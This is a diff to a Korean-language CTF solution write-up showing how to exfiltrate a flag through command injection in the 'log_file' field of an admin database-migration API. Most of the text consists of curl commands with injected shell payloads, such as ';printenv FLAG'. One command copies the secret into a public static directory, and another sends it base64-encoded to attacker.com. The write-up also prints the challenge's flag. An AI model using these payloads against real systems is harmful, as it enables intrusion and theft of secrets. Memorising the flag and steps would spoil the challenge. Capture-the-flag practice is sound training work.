@@ -557,7 +557,7 @@ curl -X POST http://target:5000/api/admin/db/migrate \
 
 ### 7.4 Exfiltrate Flag (BLIND_RCE=false)
 
-**가장 간단한 방법:** BLIND_RCE=false라면 직접 읽기
+**가장 간단한 방법:** BLIND_RCE=false라면 환경 변수에서 직접 읽기
 
 ```bash
 curl -X POST http://target:5000/api/admin/db/migrate \
@@ -569,7 +569,7 @@ curl -X POST http://target:5000/api/admin/db/migrate \
       "limit": 100,
       "include_inactive": true
     },
-    "log_file": "/tmp/x.log; cat /flag.txt"
+    "log_file": "/tmp/x.log; printenv FLAG"
   }'
 ```
 
@@ -582,15 +582,17 @@ curl -X POST http://target:5000/api/admin/db/migrate \
 }
 ```
 
+**참고:** FLAG는 환경 변수 `$FLAG`에 저장되어 있으며, `printenv FLAG` 또는 `env | grep FLAG`로 읽을 수 있습니다.
+
 **FLAG 획득!** 🎉
 
 ### 7.5 Exfiltrate Flag (BLIND_RCE=true)
 
 BLIND_RCE=true일 때는 출력이 반환되지 않으므로 다른 방법 필요:
 
-**방법 1: Static 파일로 복사**
+**방법 1: Static 파일로 복사 (추천)**
 ```bash
-# 1. Flag를 웹에서 접근 가능한 디렉토리로 복사
+# 1. FLAG 환경 변수를 웹에서 접근 가능한 디렉토리로 복사
 curl -X POST http://target:5000/api/admin/db/migrate \
   -b admin_cookies.txt \
   -H "Content-Type: application/json" \
@@ -600,11 +602,11 @@ curl -X POST http://target:5000/api/admin/db/migrate \
       "limit": 100,
       "include_inactive": true
     },
-    "log_file": "/tmp/x.log; cp /flag.txt /app/static/flag.txt"
+    "log_file": "/tmp/x.log; printenv FLAG > /app/static/captured_flag.txt"
   }'
 
 # 2. 웹에서 직접 읽기
-curl http://target:5000/static/flag.txt
+curl http://target:5000/static/captured_flag.txt
 # Output: MSG{y0ur_l34k3d_SALT_t4st3s_l1k3_JMT_4dm1n}
 ```
 
@@ -620,7 +622,7 @@ curl -X POST http://target:5000/api/admin/db/migrate \
       "limit": 100,
       "include_inactive": true
     },
-    "log_file": "/tmp/x.log; curl http://attacker.com/$(cat /flag.txt | base64 -w0).txt"
+    "log_file": "/tmp/x.log; curl http://attacker.com/$(printenv FLAG | base64 -w0).txt"
   }'
 ```
 
